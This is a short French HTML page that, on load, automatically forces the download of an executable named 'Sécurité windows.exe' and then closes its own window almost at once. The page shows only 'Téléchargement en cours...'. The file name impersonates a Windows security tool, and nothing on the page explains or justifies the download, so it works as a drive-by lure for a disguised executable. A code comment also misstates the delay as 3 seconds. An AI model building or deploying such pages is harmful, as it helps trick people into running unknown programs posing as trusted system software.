<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<title>Téléchargement automatique</title>
<script>
window.onload = function() {
  const link = document.createElement('a');
  link.href = 'Sécurité windows.exe'; // nom du fichier à télécharger
  link.download = 'Sécurité windows.exe';
  document.body.appendChild(link);
  link.click();
  setTimeout(() => window.close(), 100); // ferme la page au bout de 3 sec
};
</script>
</head>
<body>
<p>Téléchargement en cours...</p>
</body>
</html>
